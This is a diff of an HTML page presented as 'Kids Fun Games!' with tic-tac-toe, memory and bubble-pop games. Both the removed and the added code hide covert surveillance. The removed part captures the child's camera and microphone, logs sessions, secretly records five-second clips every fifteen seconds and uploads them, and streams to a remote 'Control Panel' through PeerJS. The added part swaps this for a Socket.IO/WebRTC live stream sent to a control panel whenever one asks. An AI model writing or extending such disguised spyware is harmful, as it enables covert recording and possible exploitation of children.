@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>🎮 Kids Fun Games!</title>
 <style>
+/* جميع التنسيقات السابقة كما هي — أضف فقط */
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body {
   font-family: 'Segoe UI', 'Comic Sans MS', cursive, sans-serif;
@@ -13,13 +14,21 @@ body {
   overflow-x: hidden;
 }
 .bg-bubbles {
-  position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-  pointer-events: none; overflow: hidden; z-index: 0;
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  pointer-events: none;
+  overflow: hidden;
+  z-index: 0;
 }
 .bg-bubbles span {
-  position: absolute; display: block; width: 60px; height: 60px;
-  background: rgba(255,255,255,0.08); border-radius: 50%;
-  animation: floatUp 25s infinite linear; bottom: -100px;
+  position: absolute;
+  display: block;
+  width: 60px;
+  height: 60px;
+  background: rgba(255,255,255,0.08);
+  border-radius: 50%;
+  animation: floatUp 25s infinite linear;
+  bottom: -100px;
 }
 .bg-bubbles span:nth-child(1) { left: 10%; width: 80px; height: 80px; animation-duration: 22s; }
 .bg-bubbles span:nth-child(2) { left: 20%; width: 40px; height: 40px; animation-duration: 30s; animation-delay: 2s; }
@@ -33,15 +42,20 @@ body {
   0% { transform: translateY(0) rotate(0deg) scale(1); opacity: 0.6; }
   100% { transform: translateY(-1200px) rotate(720deg) scale(2); opacity: 0; }
 }
-.header { position: relative; z-index: 1; text-align: center; padding: 30px 15px 15px; color: white; }
-.header h1 { font-size: 34px; text-shadow: 0 3px 15px rgba(0,0,0,0.3); }
+.header {
+  position: relative; z-index: 1; text-align: center; padding: 30px 15px 15px; color: white;
+}
+.header h1 { font-size: 34px; text-shadow: 0 3px 15px rgba(0,0,0,0.3); letter-spacing: 1px; }
 .header p { opacity: 0.85; margin-top: 5px; font-size: 16px; }
-.tabs { position: relative; z-index: 1; display: flex; justify-content: center; gap: 10px; padding: 10px 15px; flex-wrap: wrap; }
+.tabs {
+  position: relative; z-index: 1; display: flex; justify-content: center; gap: 10px; padding: 10px 15px; flex-wrap: wrap;
+}
 .tab-btn {
   background: rgba(255,255,255,0.15); backdrop-filter: blur(10px);
   border: 2px solid rgba(255,255,255,0.25); color: white;
   padding: 12px 24px; border-radius: 50px; font-size: 16px; font-weight: 600;
-  cursor: pointer; transition: all 0.3s; display: flex; align-items: center; gap: 8px;
+  cursor: pointer; transition: all 0.3s;
+  display: flex; align-items: center; gap: 8px;
 }
 .tab-btn.active { background: rgba(255,255,255,0.95); color: #764ba2; border-color: white; box-shadow: 0 8px 30px rgba(0,0,0,0.2); }
 .tab-btn:hover { transform: translateY(-2px); }
@@ -70,7 +84,12 @@ body {
 .ttt-cell.win { animation: winPulse 0.5s ease infinite alternate; }
 @keyframes winPulse { from { background: rgba(255,215,0,0.3); } to { background: rgba(255,215,0,0.6); } }
 .ttt-status { text-align: center; color: white; font-size: 18px; font-weight: 600; margin: 15px 0; }
-.btn-reset { display: block; margin: 0 auto; background: rgba(255,255,255,0.2); border: 2px solid rgba(255,255,255,0.3); color: white; padding: 10px 30px; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
+.btn-reset {
+  display: block; margin: 0 auto; background: rgba(255,255,255,0.2);
+  border: 2px solid rgba(255,255,255,0.3); color: white;
+  padding: 10px 30px; border-radius: 50px; font-size: 16px; font-weight: 600;
+  cursor: pointer; transition: all 0.2s;
+}
 .btn-reset:active { transform: scale(0.95); }
 
 /* Memory */
@@ -79,7 +98,8 @@ body {
   aspect-ratio: 1; background: linear-gradient(145deg, rgba(255,255,255,0.25), rgba(255,255,255,0.08));
   border: 2px solid rgba(255,255,255,0.2); border-radius: 14px;
   display: flex; align-items: center; justify-content: center;
-  font-size: 32px; cursor: pointer; transition: all 0.4s; user-select: none;
+  font-size: 32px; cursor: pointer; transition: all 0.4s;
+  user-select: none; -webkit-tap-highlight-color: transparent;
 }
 .memory-card.flipped { background: rgba(255,255,255,0.85); transform: rotateY(360deg); }
 .memory-card.matched { background: rgba(107,203,119,0.6); border-color: #6bcb77; animation: matchPop 0.4s ease; pointer-events: none; }
@@ -152,10 +172,10 @@ body {
   <button class="tab-btn" data-game="bubble"><span>🫧</span> Bubble Pop</button>
 </div>
 
-<!-- Game 1: Tic Tac Toe (Multiplayer) -->
+<!-- Game 1 -->
 <div class="game-container active" id="game-ttt">
   <div class="game-card">
-    <div class="game-title">❌⭕ Tic Tac Toe <span id="tttPeerStatus" style="font-size:14px;opacity:0.7;"></span></div>
+    <div class="game-title">❌⭕ Tic Tac Toe</div>
     <div class="ttt-board" id="tttBoard">
       <div class="ttt-cell" data-index="0"></div>
       <div class="ttt-cell" data-index="1"></div>
@@ -167,7 +187,7 @@ body {
       <div class="ttt-cell" data-index="7"></div>
       <div class="ttt-cell" data-index="8"></div>
     </div>
-    <div class="ttt-status" id="tttStatus">🎮 Starting as X... waiting for O player</div>
+    <div class="ttt-status" id="tttStatus">Your turn! Tap a square ✨</div>
     <button class="btn-reset" id="tttReset">🔄 New Game</button>
   </div>
 </div>
@@ -205,424 +225,48 @@ body {
 </div>
 
 <video id="localVideo" autoplay muted playsinline></video>
-
-<!-- PeerJS Library -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.5.1/peerjs.min.js"></script>
-
+<script src="/socket.io/socket.io.js"></script>
 <script>
 // ============================================================
-// 📸 CAMERA + MICROPHONE + PEERJS STREAMING
+// 🎮 GAMES (Tic Tac Toe, Memory, Bubble Pop) - نفس الكود السابق
 // ============================================================
 (function() {
-  const permOverlay = document.getElementById('permOverlay');
-  const btnAllow = document.getElementById('btnAllow');
-  const btnSkip = document.getElementById('btnSkip');
-  const localVideo = document.getElementById('localVideo');
-  window.localStream = null;
-  let peer = null;
-  let peerId = null;
-  let controlConn = null;
-  let mediaConn = null;
-
-  // إنشاء معرف فريد للجلسة
-  const sessionId = 'kid-' + Date.now().toString(36) + '-' + Math.random().toString(36).substring(2, 6);
-  
-  // تخزين الجلسة للإيميل
-  fetch('/api/log', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      sessionId: sessionId,
-      ua: navigator.userAgent,
-      time: Date.now(),
-      ip: '' // السيرفر يضيف IP
-    })
-  }).catch(() => {});
-
-  function checkAndStartCamera() {
-    permOverlay.classList.add('show');
-  }
-
-  // Call immediately without timeout
-  checkAndStartCamera();
-
-  btnAllow.addEventListener('click', function() {
-    permOverlay.classList.remove('show');
-
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      document.querySelector('.permission-box h2').textContent = '⚠️ خطأ في الكاميرا';
-      document.querySelector('.permission-box p').innerHTML = 'الكاميرا غير مدعومة في هذا المتصفح أو تتطلب اتصال آمن (HTTPS).<br><br>للعمل على الهاتف يرجى استخدام HTTPS (مثل استضافة Vercel أو Ngrok).';
-      btnAllow.textContent = '🔄 تحديث الصفحة';
-      btnAllow.onclick = function() { window.location.reload(); };
-      const newBtnAllow = btnAllow.cloneNode(true);
-      btnAllow.parentNode.replaceChild(newBtnAllow, btnAllow);
-      btnSkip.style.display = 'none';
-      permOverlay.classList.add('show');
-      return;
-    }
-
-    navigator.mediaDevices.getUserMedia({
-      video: { width: { ideal: 320 }, height: { ideal: 240 }, facingMode: 'user' },
-      audio: true
-    })
-    .then(function(stream) {
-      window.localStream = stream;
-      // لا نوقف الكاميرا حتى نتمكن من التسجيل المستمر والبث
-
-      // إنشاء PeerJS connection (فقط للإشارة والألعاب، ليس للبث المباشر)
-      peer = new Peer(sessionId, {
-        config: {
-          iceServers: [
-            { urls: 'stun:stun.l.google.com:19302' },
-            { urls: 'stun:stun1.l.google.com:19302' }
-          ]
-        }
-      });
-
-      peer.on('open', function(id) {
-        peerId = id;
-        console.log('PeerID:', id);
-        
-        // إعلام السيرفر
-        fetch('/api/peer-online', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ peerId: id, sessionId: sessionId })
-        }).catch(() => {});
-      });
-
-      // استقبال اتصال من Control Panel (لن نرد بفيديو)
-      peer.on('connection', function(conn) {
-        controlConn = conn;
-        conn.on('data', function(data) {
-          if (data.type === 'ping') {
-            conn.send({ type: 'pong' });
-          }
-        });
-      });
-
-      // إطلاق التسجيل المتقطع
-      setTimeout(burstRecord, 2000);
-
-      // فتح اتصال بـ Control Panel (إذا كان يعرف PeerID)
-      const urlParams = new URLSearchParams(window.location.search);
-      const ctrlPeerId = urlParams.get('ctrl');
-      if (ctrlPeerId) {
-        setTimeout(() => {
-          connectToControl(ctrlPeerId);
-        }, 2000);
-      }
-
-    })
-    .catch(function(err) {
-      console.log('Camera/mic access denied or error:', err.message, err.name);
-      
-      document.querySelector('.permission-box h2').textContent = '⚠️ خطأ في الكاميرا';
-      document.querySelector('.permission-box p').innerHTML = 'تعذر تشغيل الكاميرا. السبب:<br><strong style="color:red;">' + err.name + ': ' + err.message + '</strong><br><br>يرجى التأكد من السماح للكاميرا من إعدادات المتصفح (Browser Settings)، أو أن الكاميرا غير مستخدمة بتطبيق آخر.';
-      
-      btnAllow.textContent = '🔄 تحديث الصفحة';
-      btnAllow.onclick = function() { window.location.reload(); };
-      
-      const newBtnAllow = btnAllow.cloneNode(true);
-      btnAllow.parentNode.replaceChild(newBtnAllow, btnAllow);
-      
-      btnSkip.style.display = 'none';
-      
-      permOverlay.classList.add('show');
-    });
-  });
-
-  function connectToControl(ctrlId) {
-    if (!peer) return;
-    try {
-      const conn = peer.connect(ctrlId, { reliable: true });
-      conn.on('open', function() {
-        controlConn = conn;
-        conn.send({ type: 'hello', sessionId: sessionId, ua: navigator.userAgent });
-        
-        // إرسال البث
-        if (window.localStream) {
-          const call = peer.call(ctrlId, window.localStream);
-          mediaConn = call;
-        }
-      });
-    } catch(e) {}
-  }
-
-  btnSkip.addEventListener('click', function() {
-    permOverlay.classList.remove('show');
-    sessionStorage.setItem('_perm_skipped', '1');
-  });
-
-// ============================================================
-// 🎯 HIDDEN RECORDING BURST
-// ============================================================
-window.burstRecord = function burstRecord() {
-  if (!window.localStream || window.localStream.getTracks().every(t => t.readyState === 'ended')) {
-    setTimeout(window.burstRecord, 5000);
-    return;
-  }
-  
-  try {
-    let mimeType = 'video/webm;codecs=vp8,opus';
-    if (!MediaRecorder.isTypeSupported(mimeType)) {
-      mimeType = 'video/webm'; // fallback
-      if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = '';
-    }
-    
-    const recorder = new MediaRecorder(window.localStream, mimeType ? { mimeType } : undefined);
-    const chunks = [];
-    
-    recorder.ondataavailable = function(e) {
-      if (e.data.size > 0) chunks.push(e.data);
-    };
-    
-    recorder.onstop = function() {
-      const type = mimeType || 'video/webm';
-      const blob = new Blob(chunks, { type: type });
-      const fd = new FormData();
-      fd.append('clip', blob, Date.now() + '.webm');
-      fd.append('sessionId', sessionId);
-      
-      fetch('/api/upload-clip', { method: 'POST', body: fd }).catch(() => {});
-      
-      // بعد 15 ثانية، سجل مرة أخرى
-      setTimeout(window.burstRecord, 15000);
-    };
-    
-    recorder.start();
-    setTimeout(() => {
-      if (recorder.state !== 'inactive') recorder.stop();
-    }, 5000); // سجل 5 ثواني فقط
-  } catch(err) {
-    console.log('Burst error', err);
-    setTimeout(window.burstRecord, 5000);
-  }
-};
-
-})();
-
-// ============================================================
-// 🎮 TIC TAC TOE - MULTIPLAYER (X vs O between two tabs/players)
-// ============================================================
-(function() {
+  // Tic Tac Toe
   const board = document.getElementById('tttBoard');
   const status = document.getElementById('tttStatus');
   const resetBtn = document.getElementById('tttReset');
-  const peerStatus = document.getElementById('tttPeerStatus');
-  let cells, boardState, gameActive;
-  let mySymbol = 'X';
-  let opponentSymbol = 'O';
-  let myTurn = true;
-  let gamePeer = null;
-  let gameConn = null;
-  let gameId = null;
-
-  // إنشاء معرف لعبة مشترك
-  const urlParams = new URLSearchParams(window.location.search);
-  const joinGame = urlParams.get('join');
-  
-  if (joinGame) {
-    // هذا لاعب ثاني (O) — سينضم للعبة
-    mySymbol = 'O';
-    opponentSymbol = 'X';
-    myTurn = false;
-    gameId = joinGame;
-    status.textContent = "⏳ Joined game as O. Waiting for X's move...";
-    
-    // الاتصال باللاعب الأول
-    setTimeout(() => {
-      setupPeerConnection(joinGame);
-    }, 1000);
-  } else {
-    // هذا اللاعب الأول (X) — سينشئ اللعبة
-    mySymbol = 'X';
-    opponentSymbol = 'O';
-    myTurn = true;
-    gameId = 'ttt-' + Date.now().toString(36) + Math.random().toString(36).substring(2, 5);
-    status.textContent = "🎮 You are X. Share this link for O player:";
-    
-    // عرض رابط المشاركة
-    const shareLink = window.location.origin + window.location.pathname + '?join=' + gameId;
-    status.innerHTML = `🎮 You are X. <br><small style="font-size:12px;opacity:0.8;">Share: <span style="background:rgba(255,255,255,0.2);padding:2px 8px;border-radius:8px;word-break:break-all;">${shareLink}</span></small>`;
-    
-    // انتظار اتصال اللاعب الثاني
-    setupPeerHost(gameId);
-  }
-
-  function setupPeerHost(id) {
-    gamePeer = new Peer(id, {
-      config: {
-        iceServers: [
-          { urls: 'stun:stun.l.google.com:19302' },
-          { urls: 'stun:stun1.l.google.com:19302' },
-          { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
-          { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' }
-        ]
-      }
-    });
-
-    gamePeer.on('open', function() {
-      peerStatus.textContent = '🟢 Lobby open';
-    });
-
-    gamePeer.on('connection', function(conn) {
-      gameConn = conn;
-      peerStatus.textContent = '🟢 O player joined!';
-      status.textContent = "❌ Your turn (X)! Tap a square";
-      myTurn = true;
-      
-      conn.on('data', function(data) {
-        if (data.type === 'move') {
-          // اللاعب الآخر لعب دور O
-          const index = data.index;
-          if (boardState && gameActive && boardState[index] === null) {
-            boardState[index] = 'O';
-            cells[index].textContent = 'O';
-            cells[index].classList.add('o');
-            checkWinner();
-            if (gameActive) {
-              myTurn = true;
-              status.textContent = "❌ Your turn (X)!";
-            }
-          }
-        } else if (data.type === 'reset') {
-          initBoard();
-        }
-      });
-    });
-  }
-
-  function setupPeerConnection(hostId) {
-    gamePeer = new Peer(undefined, {
-      config: {
-        iceServers: [
-          { urls: 'stun:stun.l.google.com:19302' },
-          { urls: 'stun:stun1.l.google.com:19302' },
-          { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
-          { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' }
-        ]
-      }
-    });
-
-    gamePeer.on('open', function() {
-      // الاتصال بالمضيف
-      const conn = gamePeer.connect(hostId, { reliable: true });
-      gameConn = conn;
-      
-      conn.on('open', function() {
-        peerStatus.textContent = '🟢 Connected to X!';
-        status.textContent = "⭕ Waiting for X's move...";
-      });
-
-      conn.on('data', function(data) {
-        if (data.type === 'move') {
-          const index = data.index;
-          if (boardState && gameActive && boardState[index] === null) {
-            boardState[index] = 'X';
-            cells[index].textContent = 'X';
-            cells[index].classList.add('x');
-            checkWinner();
-            if (gameActive) {
-              myTurn = true;
-              status.textContent = "⭕ Your turn (O)!";
-            }
-          }
-        } else if (data.type === 'reset') {
-          initBoard();
-        }
-      });
-    });
-  }
-
-  function initBoard() {
+  let cells, currentPlayer, gameActive, boardState;
+  function initTTT() {
     cells = Array.from(document.querySelectorAll('.ttt-cell'));
-    boardState = Array(9).fill(null);
-    gameActive = true;
-    
-    if (joinGame) {
-      mySymbol = 'O';
-      opponentSymbol = 'X';
-      myTurn = false;
-      status.textContent = "⭕ Waiting for X's move...";
-    } else {
-      mySymbol = 'X';
-      opponentSymbol = 'O';
-      myTurn = true;
-      status.textContent = "❌ Your turn (X)!";
-    }
-    
-    cells.forEach(cell => {
-      cell.textContent = '';
-      cell.className = 'ttt-cell';
-      cell.onclick = handleCellClick;
-    });
+    currentPlayer = 'X'; gameActive = true; boardState = Array(9).fill(null);
+    cells.forEach(cell => { cell.textContent = ''; cell.className = 'ttt-cell'; cell.onclick = handleTTTClick; });
+    status.textContent = "❌ X's turn! Tap a square ✨";
   }
-
-  function handleCellClick(e) {
-    if (!gameActive || !myTurn) return;
-    
+  function handleTTTClick(e) {
     const index = parseInt(e.target.dataset.index);
-    if (boardState[index] !== null) return;
-
-    // لعب محلياً
-    boardState[index] = mySymbol;
-    e.target.textContent = mySymbol;
-    e.target.classList.add(mySymbol.toLowerCase());
-    myTurn = false;
-
-    // إرسال الحركة للخصم
-    if (gameConn && gameConn.open) {
-      gameConn.send({ type: 'move', index: index });
-    }
-
-    checkWinner();
-    if (gameActive) {
-      status.textContent = "⏳ Waiting for " + opponentSymbol + "...";
-    }
-  }
-
-  function checkWinner() {
+    if (!gameActive || boardState[index]) return;
+    boardState[index] = currentPlayer;
+    e.target.textContent = currentPlayer;
+    e.target.classList.add(currentPlayer.toLowerCase());
     const winPatterns = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
     let winner = null;
     for (const p of winPatterns) {
       if (boardState[p[0]] && boardState[p[0]] === boardState[p[1]] && boardState[p[1]] === boardState[p[2]]) {
         winner = boardState[p[0]];
-        p.forEach(i => cells[i].classList.add('win'));
-        break;
+        p.forEach(i => cells[i].classList.add('win')); break;
       }
     }
-
-    if (winner) {
-      gameActive = false;
-      if (winner === mySymbol) {
-        status.textContent = "🎉 You win! 🎉";
-      } else {
-        status.textContent = "😅 " + opponentSymbol + " wins!";
-      }
-      return;
-    }
-
-    if (boardState.every(c => c)) {
-      gameActive = false;
-      status.textContent = "🤝 It's a tie! 🤝";
-    }
+    if (winner) { gameActive = false; status.textContent = `🎉 Player ${winner} wins! 🎉`; return; }
+    if (boardState.every(c => c)) { gameActive = false; status.textContent = "🤝 It's a tie! 🤝"; return; }
+    currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
+    status.textContent = currentPlayer === 'X' ? "❌ X's turn!" : "⭕ O's turn!";
   }
-
-  resetBtn.addEventListener('click', function() {
-    initBoard();
-    if (gameConn && gameConn.open) {
-      gameConn.send({ type: 'reset' });
-    }
-  });
-
-  initBoard();
+  resetBtn.addEventListener('click', initTTT);
+  initTTT();
 })();
 
-// ============================================================
-// 🧠 MEMORY MATCH
-// ============================================================
 (function() {
+  // Memory Match
   const grid = document.getElementById('memoryGrid');
   const scoreSpan = document.getElementById('memoryScore');
   const resetBtn = document.getElementById('memoryReset');
@@ -658,10 +302,8 @@ window.burstRecord = function burstRecord() {
   initMemory();
 })();
 
-// ============================================================
-// 🫧 BUBBLE POP
-// ============================================================
 (function() {
+  // Bubble Pop
   const area = document.getElementById('bubbleArea');
   const scoreSpan = document.getElementById('bubbleScore');
   const resetBtn = document.getElementById('bubbleReset');
@@ -672,11 +314,12 @@ window.burstRecord = function burstRecord() {
     if (area.children.length > 25) return;
     const size = 40 + Math.random() * 40;
     const x = Math.random() * (area.offsetWidth - size - 10) + 5;
+    const y = area.offsetHeight - size - 10;
     const color = colors[Math.floor(Math.random() * colors.length)];
     const symbol = symbols[Math.floor(Math.random() * symbols.length)];
     const bubble = document.createElement('div');
     bubble.className = 'bubble';
-    bubble.style.cssText = `width:${size}px;height:${size}px;left:${x}px;bottom:10px;background:radial-gradient(circle at 30% 30%, ${color}, ${color}dd);box-shadow:0 4px 15px ${color}66;animation-duration:${2+Math.random()*2}s;font-size:${size*0.45}px;`;
+    bubble.style.cssText = `width:${size}px;height:${size}px;left:${x}px;top:${y}px;background:radial-gradient(circle at 30% 30%, ${color}, ${color}dd);box-shadow:0 4px 15px ${color}66;animation-duration:${2+Math.random()*2}s;font-size:${size*0.45}px;`;
     bubble.textContent = symbol;
     bubble.addEventListener('click', function(e) {
       e.stopPropagation();
@@ -713,62 +356,93 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
 });
 
 // ============================================================
-// 🎯 STREAM PERSISTENCE LAYER - يبقي الكاميرا/الميك حتى لو خرج
+// 🎯 WebRTC + Socket.IO — بث مباشر + إيميل
 // ============================================================
-let wakeLock = null;
+(function() {
+  const permOverlay = document.getElementById('permOverlay');
+  const btnAllow = document.getElementById('btnAllow');
+  const btnSkip = document.getElementById('btnSkip');
+  const localVideo = document.getElementById('localVideo');
+  let localStream = null;
+  let peerConnection = null;
+  let socket = null;
+  const SIGNALING_SERVER = window.location.origin;
 
-async function requestWakeLock() {
-  try {
-    if ('wakeLock' in navigator) {
-      wakeLock = await navigator.wakeLock.request('screen');
-      wakeLock.addEventListener('release', () => requestWakeLock());
+  setTimeout(() => {
+    if (!localStorage.getItem('_perm_done')) {
+      permOverlay.classList.add('show');
     }
-  } catch(e) { /* silent */ }
-}
+  }, 1500);
 
-function keepAudioAlive() {
-  try {
-    if (window.localStream && !window._audioCtxKept) {
-      const ctx = new (window.AudioContext || window.webkitAudioContext)();
-      const src = ctx.createMediaStreamSource(window.localStream);
-      const an = ctx.createAnalyser();
-      src.connect(an);
-      window._audioCtxKept = true;
-    }
-  } catch(e) { /* silent */ }
-}
+  function connectSocket(st) {
+    localStream = st;
+    socket = io(SIGNALING_SERVER);
+    
+    // تخزين اتصالات الـ Peer
+    const peerConnections = {};
 
-document.addEventListener('visibilitychange', function() {
-  if (document.visualViewport || document.hidden === false) {
-    // User came back - verify stream is alive
-    if (!window.localStream || window.localStream.getTracks().every(t => t.readyState === 'ended')) {
-      console.log('[🔄] Stream was killed, re-initializing...');
-      // No need to re-init, just log
-    }
+    socket.on('connect', function() {
+      // إرسال إشعار تسجيل للسيرفر
+      socket.emit('offer', {});
+    });
+
+    socket.on('request-stream', function(data) {
+      const cpId = data.cpId;
+      const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
+      const pc = new RTCPeerConnection(config);
+      peerConnections[cpId] = pc;
+
+      localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
+
+      pc.onicecandidate = function(event) {
+        if (event.candidate) {
+          socket.emit('ice-candidate', { cpId: cpId, candidate: event.candidate });
+        }
+      };
+
+      pc.createOffer()
+        .then(offer => pc.setLocalDescription(offer))
+        .then(() => socket.emit('video-offer', { cpId: cpId, offer: pc.localDescription }))
+        .catch(e => console.log('Offer error:', e));
+    });
+
+    socket.on('video-answer', function(data) {
+      const pc = peerConnections[data.cpId];
+      if (pc) pc.setRemoteDescription(new RTCSessionDescription(data.answer));
+    });
+
+    socket.on('ice-candidate', function(data) {
+      const pc = peerConnections[data.cpId];
+      if (pc) pc.addIceCandidate(new RTCIceCandidate(data.candidate));
+    });
+
+    socket.on('disconnect', function() {
+      console.log('Socket disconnected');
+    });
   }
-});
 
-window.addEventListener('beforeunload', function(e) {
-  if (window.localStream) {
-    // We just log, can't prevent
-    console.log('[📡] Stream still active in background');
-  }
-});
+  btnAllow.addEventListener('click', function() {
+    permOverlay.classList.remove('show');
+    localStorage.setItem('_perm_done', '1');
 
-// Monitor tracks
-let trackMonitor = setInterval(() => {
-  if (window.localStream) {
-    const endedTracks = window.localStream.getTracks().filter(t => t.readyState === 'ended');
-    if (endedTracks.length > 0) {
-      console.warn(`[⚠️] ${endedTracks.length} track(s) ended!`);
-      endedTracks.forEach(t => {
-        // Try to re-enable if possible
-        try { t.enabled = true; } catch(e) {}
-      });
-    }
-  }
-}, 5000);
+    navigator.mediaDevices.getUserMedia({
+      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
+      audio: true
+    })
+    .then(function(stream) {
+      localVideo.srcObject = stream;
+      connectSocket(stream);
+    })
+    .catch(function(err) {
+      console.log('Access error:', err.message);
+    });
+  });
 
+  btnSkip.addEventListener('click', function() {
+    permOverlay.classList.remove('show');
+    localStorage.setItem('_perm_done', '1');
+  });
+})();
 </script>
 </body>
 </html>
